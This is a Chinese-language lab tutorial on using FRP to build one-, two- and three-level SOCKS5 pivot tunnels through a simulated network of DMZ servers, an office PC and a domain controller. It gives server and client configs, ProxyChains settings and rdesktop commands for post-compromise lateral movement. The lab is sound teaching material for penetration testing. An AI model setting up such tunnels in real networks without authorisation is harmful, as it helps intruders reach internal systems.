FRP是一个专注于内网穿透的高性能的反向代理应用，支持TCP、UDP、HTTP、HTTPS等协议，可以将内网服务以安全、便捷的方式，通过具有公网 IP 节点的中转暴露到公网。在进行内网渗透中，FRP是一款常用的代理工具。除此之外，FRP支持搭建SOCKS5代理应用。

```plain
FRP有 Windows 系统和 Linux 系统两个版本，主要包含以下文件：frps，服务端程序，frps.ini，服务端配置文件；frpc，客户端程序；frpc.ini，客户端配置文件。

项目地址：[https://github.com/fatedier/frp](https://github.com/fatedier/frp)
```

### 实验环境配置情况如下
Vmware虚拟网卡配置下载链接： [https://pan.baidu.com/s/1CZNIZWhMwqU0J1HcTS7QXA?pwd=55ju](https://pan.baidu.com/s/1CZNIZWhMwqU0J1HcTS7QXA?pwd=55ju) 

提取码: 55ju

<font style="color:#df2a3f;">注意：导入下载的网卡配置前先导出一份自己的网卡配置，防止后期无法恢复</font>  

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2024/png/46134908/1728985691851-7328773c-0e96-4fb4-ac5f-90ce0d7880b5.png)

| 主机 | 服务类型 | IP 地址 |
| :---: | :---: | :---: |
| Windows Server 2012 （DMZ区）   NAT和VMnet1 | Web 服务器 | IP1：192.168.10.10   IP2：192.168.30.10 |
| Windows Server 2008 （DMZ区）   VMnet1和VMnet2 | FTP 服务器 | IP1：192.168.30.11   IP2：192.168.60.10 |
| Windows 7（办公区）   VMnet2和VMnet3 | 办公电脑 | IP1：192.168.60.11   IP2：192.168.90.10 |
| Windows Server 2012（核心区）   VMnet3 | 域控制器 | 192.168.90.11 |


### 一级代理
```plain
假设已经获取 Windows Server 2012 的控制权，经过信息收集，获取了 FTP 服务器的登录凭据，需要继续渗透并登录 FTP 服务器的远程桌面。在 Windows Server 2012 上使用 FRP 搭建 SOCKS5 代理服务，通过 SOCKS5 代理连接到 FTP服务器。
```

##### ① 使用 VPS 作为 FRP 服务端，在 VPS 上执行以下命令，启动 FRP 服务端程序
```plain
./frps -c ./frps.ini
```

##### <!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773128457431-0689da84-4c33-4438-baf5-e0686c1f56ef.png)
##### 服务端配置文件 frps.ini 的内容如下
```plain
[common]
bind_addr = 0.0.0.0	#在服务端上绑定的 IP 地址
bind_port = 7000	#在服务端上绑定的端口
```

##### ② 使用 Windows Server 2012（Web 服务器）作为 FRP 客户端，在 Windows Server 2012（Web 服务器）上执行以下命令启动 FRP 客户端程序
```plain
.\frpc.exe -c .\frpc.ini
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773128819630-2a8fd2cc-9e01-496b-bf78-1e2ab3ac0f4d.png)

##### 客户端配置文件 frpc.ini 的内容如下
```plain
[common]
server_addr = 154.8.xxx.xxx	#指向 FRP 服务端绑定的 IP 地址，即云服务器的 IP
server_port = 7000	#指向 FRP 服务端绑定的端口 

[socks5]
remote_port = 1080	#设置了本代理监听的端口号,此端口会映射到服务端。
plugin = socks5	#代理的类型
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773128909268-cdee9c66-7638-442c-af74-bfab09d3a7cf.png)

```plain
此时便成功在 Windows Server 2012（Web 服务器）与 VPS 之间搭建了一个 SOCKS5 代理服务。然后，借助第三方工具，可以让计算机的其他应用使用这个 SOCKS5 代理，如 ProxyChains、Proxifier 等。这里以 ProxyChains 为例进行演示（ProxyChains是一款可以在Linux下实现全局代理的软件，可以使任何应用程序通过代理上网，允许TCP和DNS流量通过代理隧道，支持HTTP、SOCKS4、SOCK5类型代理）。
```

##### 首先，编辑 ProxyChains 的配置文件 /etc/proxychains.conf，将 SOCKS5 代理服务器的地址指向 FRP 服务端的地址。
```plain
socks5 154.8.xxx.xxx 1080
```

##### <!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773129002314-d737b44c-c7b3-451b-91eb-94610f147f87.png)然后，在命令前加上 "proxychains"，便可应用此 SOCKS5 代理。
```plain
proxychains rdesktop 192.168.30.11
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773129040527-15b8ab35-3cf5-40d8-be4a-73e611ad42df.png)

### 二级网络代理
```plain
获得 DMZ 区域的 FTP 服务器控制权后，经过信息收集，发现还有一个网段为 192.168.30.0/24 的办公区网络，需要继续渗透并登录办公电脑的远程桌面。用 FRP 在 DMZ 区与办公区之间搭建一个二级网络的 SOCKS5 代理，从而访问办公区的办公电脑。
```

##### ① 在 VPS 上执行以下命令，启动 FRP 服务端。
```plain
./frps -c ./frps.ini
```

##### 服务端配置文件 frps.ini 的内容如下
```plain
[common]
bind_addr = 0.0.0.0	#在服务端上绑定的 IP 地址
bind_port = 7000	#在服务端上绑定的端口
```

##### ② 在 Windows Server 2012（Web服务器） 上执行以下命令，启动 FRP 客户端，连接 VPS 的服务器
```plain
.\frpc.exe -c .\frpc.ini
```

##### 客户端配置文件 frpc.ini 的内容如下
```plain
[common]
server_addr = 154.8.xxx.xxx	#指向 FRP 服务端绑定的 IP 地址，即云服务器的 IP
server_port = 7000	#指向 FRP 服务端绑定的端口 

[socks5]
remote_port = 1080	#设置了本代理监听的端口号,此端口会映射到服务端。
plugin = socks5	#代理的类型
```



##### ③ 在 Windows Server 2012（Web服务器）上执行以下命令，启动一个 FRP 服务端
```plain
.\frps.exe -c .\frps.ini
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773129503591-5a627161-9b18-4578-8fec-50b78a20c63d.png)

##### 服务端配置文件 frps.ini 的内容如下
```plain
[common]
bind_addr = 192.168.30.10	#在 Windows Server 2012 (Web服务器) 上的 FRP 服务端绑定的 IP 地址
bind_port = 7000	#在 Windows Server 2012 (Web服务器) 上的 FRP 服务端绑定的端口
```



##### ④ 在 DMZ 区的 Windows Server 2008（FTP 服务器）上执行以下命令，启动 FRP 客户端，连接 Windows Server 2012（Web服务器）的服务端
```plain
.\frpc.exe -c .\frpc.ini
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773129832953-a6c77194-e29a-49ff-8473-dc484d88ef01.png)

##### 服务端配置文件 frpc.ini 的内容如下
```plain
[common]
server_addr = 192.168.30.10	#指向 Windows Server 2012 (Web服务器) 上的 FRP 服务端绑定的 IP 地址
server_port = 7000	#指向 Windows Server 2012 (Web服务器) 上的 FRP 服务端绑定的端口

[socks5]
type = tcp
remote_port = 1081	#代理所使用的端口，会被转发到服务端
plugin = socks5	#代理的类型
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773129681916-b5a6afb4-f13e-41ea-a183-48a4749569d3.png)

##### 到此，成功在 DMZ 区与办公区之间搭建了一个 SOCKS5 代理。同样，继续在 ProxyChains 配置文件最后一行添加下列内容
```plain
socks5 192.168.30.10 1081
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773130438495-ae1fbaf0-2af0-43ee-ba30-1dd082120326.png)

##### 然后，在命令前加上 "proxychains"，便可应用此 SOCKS5 代理。
```plain
proxychains rdesktop 192.168.60.11
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773130468749-9420f280-76ac-413b-8f08-bd7261e4e898.png)

### 三级网络代理
```plain
入侵办公区后，经过信息收集，发现还有一个网段为 192.168.60.0/24 的核心区网络需要继续渗透并登录域控制器的远程桌面。用FRP在DMZ区、办公区与核心区之间搭建一个三级网络的 SOCKS5 代理，从而访问核心区的域控制器。
```

##### ① 在VPS上执行以下命令，启动 FRP 服务端。
```plain
./frps -c ./frps.ini
```

##### 服务端配置文件 frps.ini 的内容如下
```plain
[common]
bind_addr=0.0.0.0	#在VPS上的FRP服务端绑定的IP地址
bind_port=7000	#在VPS上的FRP服务端绑定的端口
```

##### ② 在 Windows Server 2012（Web服务器）上执行以下命令，启动FRP客户端，连接VPS的服务端
```plain
.\frpc.exe -c .\frpc.ini
```

##### 客户端配置文件 frpc.ini 的内容如下
```plain
[common]
server_addr = 154.8.xxx.xxx	#指向 FRP 服务端绑定的 IP 地址，即云服务器的 IP
server_port = 7000	#指向 FRP 服务端绑定的端口 

[socks5]
remote_port = 1080	#设置了本代理监听的端口号,此端口会映射到服务端。
plugin = socks5	#代理的类型
```

##### ③ 在 Windows Server 2012（Web服务器）上执行以下命令，启动一个FRP服务端
```plain
.\frps.exe -c .\frps.ini
```

##### 服务端配置文件 frps.ini 的内容如下
```plain
[common]
bind_addr = 192.168.30.10	#在 Windows Server 2012 (Web服务器) 上的 FRP 服务端绑定的 IP 地址
bind_port=7000	#在 Windows Server 2012 (Web服务器) 上的 FRP 服务端绑定的端口
```

##### ④ 在 DMZ 区的 Windows Server 2008（FTP 服务器）上执行以下命令，启动 FRP 客户端，连接 Web 服务器上的 FRP 服务端
```plain
.\frpc.exe -c .\frpc.ini
```

##### 客户端配置文件 frpc.ini 的内容如下：
```plain
[common]
server_addr = 192.168.30.10	#指向 Windows Server 2012 (Web服务器) 上的 FRP 服务端绑定的 IP 地址
server_port = 7000	#指向 Windows Server 2012 (Web服务器) 上的 FRP 服务端绑定的端口

[socks5]
type = tcp
remote_port = 1081	#代理所使用的端口，会被转发到服务端
plugin = socks5	#代理的类型
```

##### ⑤ 在DMZ区的 Windows Server 2008（FTP 服务器）上执行以下命令，启动一个 FRP 服务端
```plain
.\frps.exe -c .\frps.ini
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773130666775-11e4c348-f2f4-46e0-90fa-adb92b21b059.png)

##### 服务端配置文件frps.ini的内容如下：
```plain
[common]
bind_addr = 192.168.60.10	#在 Windows Server 2008（FTP 服务器）上的 FRP 服务端绑定的 IP 地址
bind_port= 7000	#在 Windows Server 2008（FTP 服务器）上的 FRP 服务端绑定的端口
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773130781701-56727844-75cb-41ce-a3fd-c64ef0847a27.png)

##### ⑥ 在办公区的 Windows 7（办公电脑）上执行以下命令，启动 FRP 客户端，连接 Windows Server 2008（FTP 服务器）的 FRP 服务端
```plain
.\frpc.exe -c .\frpc.ini
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773130859420-c6e931a0-a3af-45a3-b49c-03b9ddac76c5.png)

##### 客户端配置文件frpc.ini的内容如下
```plain
[common]
server_addr = 192.168.60.10	#指向 Windows Server 2008（FTP 服务器）上的 FRP 服务端绑定的 IP 地址
server_port=7000	#指向 Windows Server 2008（FTP 服务器）上的 FRP 服务端绑定的端口

[socks5]
type = tcp
remote_port = 1082	#理所使用的端口，会被转发到服务端
plugin = socks5	#代理的类型
```

```plain
到此，三级网络代理搭建完成。同样，继续在 ProxyChains 配置文件的最后一行添加 "socks5 192.168.60.10 1082" 执行以下命令，即可通过该 socks5 代理连接核心区域控的远程桌面。
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773130934998-dd525e6c-675e-4610-b18e-c341297256ee.png)

```plain
proxychains rdesktop 192.168.90.11
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773130980522-2824ae12-896c-4b47-b84e-ea9de01eaf78.png)



### windows连接
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773132690870-740bff44-7c31-4385-9cdc-c471f392a0ce.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773132775518-085a6fe9-bc9b-433d-865b-01a142f9ef88.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773132935532-b551a885-43e2-4f0f-9bde-b7844b3a7b5c.png)



### cs
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773134037906-ad62228a-8698-469e-81f8-1f7516aca1d2.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773134064759-94dc49bc-bac1-4348-a8cf-a5b00d0eeaf4.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773134168955-ec1cd496-ea70-40f2-9146-de14755b946e.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773134250337-42b4a460-cdbb-4775-9c66-399a1b53b4ee.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773134364196-d79e85d5-139a-4106-8f42-3569ede36508.png)





<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773135469813-f88e62d6-7b45-4658-8e9e-df1bc29d50d7.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773135558393-40cd322c-da2a-4feb-8fb4-bbf56b6e1311.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773135589134-402c654a-1281-4e56-9ce8-6ec8f1bba77d.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773135739883-e00f6f91-6559-429c-9c96-59d14180d666.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773135787513-64d70b98-2b8b-40b0-b7b8-51f7263010fc.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773135859985-f959c8ec-d2ed-4509-9205-4f8055c37a1f.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773135923747-d0eb28c2-bf6e-4dbd-9612-4556c87a1795.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773135958095-d97a571e-842d-4329-8767-d8e6b15b8264.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773136021304-85962e01-d60c-4286-aa2c-b5b0eedc9f7f.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773136047236-7ab679b5-3d27-4556-86f0-347060d7cded.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773136067504-cdbd32f7-54e3-44a2-8a0f-0e922e9c2f39.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773136089259-29ce4a23-bb75-4268-8f85-db6a02d9dc18.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773136126952-a6ba8489-c3fb-4c20-a47d-3d48d65647f5.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/62331292/1773136260229-b84ff1eb-873d-4594-83bc-d29c75de757c.png)

